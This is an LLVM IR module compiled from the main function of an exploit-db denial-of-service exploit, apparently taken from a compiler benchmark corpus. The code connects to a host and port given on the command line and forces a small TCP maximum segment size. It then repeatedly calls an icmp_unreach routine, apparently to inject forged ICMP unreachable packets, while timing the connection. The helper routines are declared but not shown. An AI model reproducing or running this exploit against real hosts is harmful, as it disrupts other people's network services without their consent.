; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_20997.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_20997.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.sockaddr = type { i32 }

@NEW_MSS = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@F_GETFL = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i32 0, align 4
@F_SETFL = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@TCP_NODELAY = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EINPROGRESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@IPPROTO_TCP = common dso_local global i32 0, align 4
@TCP_MAXSEG = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [15 x i8] c"Remote mss %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"getsockopt\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"getsockname\00", align 1
@ENOBUFS = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [5 x i8] c"read\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"Elapsed time %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [16374 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.timeval, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @NEW_MSS, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* %11, align 4
  %18 = call i32 @primedefaultmss(i32 -1, i32 %17)
  %19 = load i32, i32* @AF_INET, align 4
  %20 = load i32, i32* @SOCK_STREAM, align 4
  %21 = call i32 @socket(i32 %19, i32 %20, i32 0)
  store i32 %21, i32* %8, align 4
  %22 = load i32, i32* %8, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 @err(i32 1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  br label %26

26:                                               ; preds = %24, %2
  %27 = bitcast %struct.sockaddr_in* %7 to i8*
  %28 = call i32 @memset(i8* %27, i32 0, i32 12)
  %29 = load i32, i32* @AF_INET, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %29, i32* %30, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  %35 = call i32 @ntohs(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %35, i32* %36, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @inet_addr(i8* %39)
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %41, i32 0, i32 0
  store i32 %40, i32* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = load i32, i32* %11, align 4
  %45 = call i32 @primedefaultmss(i32 %43, i32 %44)
  %46 = load i32, i32* %8, align 4
  %47 = load i32, i32* @F_GETFL, align 4
  %48 = call i32 @fcntl(i32 %46, i32 %47, i32 0)
  store i32 %48, i32* %9, align 4
  %49 = load i32, i32* %9, align 4
  %50 = icmp ne i32 %49, -1
  br i1 %50, label %51, label %59

51:                                               ; preds = %26
  %52 = load i32, i32* @O_NONBLOCK, align 4
  %53 = load i32, i32* %9, align 4
  %54 = or i32 %53, %52
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* @F_SETFL, align 4
  %57 = load i32, i32* %9, align 4
  %58 = call i32 @fcntl(i32 %55, i32 %56, i32 %57)
  br label %59

59:                                               ; preds = %51, %26
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %8, align 4
  %61 = load i32, i32* @SOL_SOCKET, align 4
  %62 = load i32, i32* @TCP_NODELAY, align 4
  %63 = call i32 @setsockopt(i32 %60, i32 %61, i32 %62, i32* %9, i32 4)
  %64 = load i32, i32* %8, align 4
  %65 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %66 = call i64 @connect(i32 %64, %struct.sockaddr* %65, i32 12)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %74

68:                                               ; preds = %59
  %69 = load i64, i64* @errno, align 8
  %70 = load i64, i64* @EINPROGRESS, align 8
  %71 = icmp ne i64 %69, %70
  br i1 %71, label %72, label %74

72:                                               ; preds = %68
  %73 = call i32 @err(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  br label %74

74:                                               ; preds = %72, %68, %59
  store i32 4, i32* %10, align 4
  %75 = load i32, i32* %8, align 4
  %76 = load i32, i32* @IPPROTO_TCP, align 4
  %77 = load i64, i64* @TCP_MAXSEG, align 8
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @getsockopt(i32 %75, i32 %76, i64 %77, i8* %78, i32* %10)
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %84, label %81

81:                                               ; preds = %74
  %82 = load i32, i32* %9, align 4
  %83 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i32 %82)
  br label %86

84:                                               ; preds = %74
  %85 = call i32 @err(i32 1, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  br label %86

86:                                               ; preds = %84, %81
  store i32 12, i32* %10, align 4
  %87 = load i32, i32* %8, align 4
  %88 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %89 = call i64 @getsockname(i32 %87, %struct.sockaddr* %88, i32* %10)
  %90 = icmp ne i64 %89, 0
  br i1 %90, label %91, label %93

91:                                               ; preds = %86
  %92 = call i32 @err(i32 1, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  br label %93

93:                                               ; preds = %91, %86
  %94 = load i32, i32* %8, align 4
  %95 = getelementptr inbounds [16374 x i8], [16374 x i8]* %12, i64 0, i64 0
  %96 = call i32 @read(i32 %94, i8* %95, i32 16374)
  %97 = call i32 @time(i32* null)
  store i32 %97, i32* %13, align 4
  store i32 2, i32* %9, align 4
  br label %98

98:                                               ; preds = %127, %93
  %99 = load i32, i32* %9, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %130

101:                                              ; preds = %98
  %102 = call i32 @icmp_unreach(%struct.sockaddr_in* %6, %struct.sockaddr_in* %7)
  %103 = load i32, i32* %8, align 4
  %104 = getelementptr inbounds [16374 x i8], [16374 x i8]* %12, i64 0, i64 0
  %105 = call i32 @read(i32 %103, i8* %104, i32 16374)
  store i32 %105, i32* %10, align 4
  %106 = load i32, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %126

108:                                              ; preds = %101
  %109 = load i64, i64* @errno, align 8
  %110 = load i64, i64* @ENOBUFS, align 8
  %111 = icmp eq i64 %109, %110
  br i1 %111, label %120, label %112

112:                                              ; preds = %108
  %113 = load i64, i64* @errno, align 8
  %114 = load i64, i64* @EAGAIN, align 8
  %115 = icmp eq i64 %113, %114
  br i1 %115, label %120, label %116

116:                                              ; preds = %112
  %117 = load i64, i64* @errno, align 8
  %118 = load i64, i64* @EWOULDBLOCK, align 8
  %119 = icmp eq i64 %117, %118
  br i1 %119, label %120, label %124

120:                                              ; preds = %116, %112, %108
  %121 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 1
  store i64 0, i64* %121, align 8
  %122 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 0
  store i32 10000, i32* %122, align 8
  %123 = call i32 @select(i32 3, i32* null, i32* null, i32* null, %struct.timeval* %15)
  br label %127

124:                                              ; preds = %116
  %125 = call i32 @warn(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  br label %130

126:                                              ; preds = %101
  br label %127

127:                                              ; preds = %126, %120
  %128 = load i32, i32* %9, align 4
  %129 = add nsw i32 %128, -1
  store i32 %129, i32* %9, align 4
  br label %98

130:                                              ; preds = %124, %98
  %131 = call i32 @time(i32* null)
  store i32 %131, i32* %14, align 4
  %132 = load i32, i32* %14, align 4
  %133 = load i32, i32* %13, align 4
  %134 = sub nsw i32 %132, %133
  %135 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i32 %134)
  %136 = load i32, i32* %8, align 4
  %137 = call i32 @primedefaultmss(i32 %136, i32 0)
  %138 = load i32, i32* %8, align 4
  %139 = call i32 @close(i32 %138)
  ret i32 0
}

declare dso_local i32 @primedefaultmss(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @fcntl(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @getsockopt(i32, i32, i64, i8*, i32*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i64 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @icmp_unreach(%struct.sockaddr_in*, %struct.sockaddr_in*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @warn(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
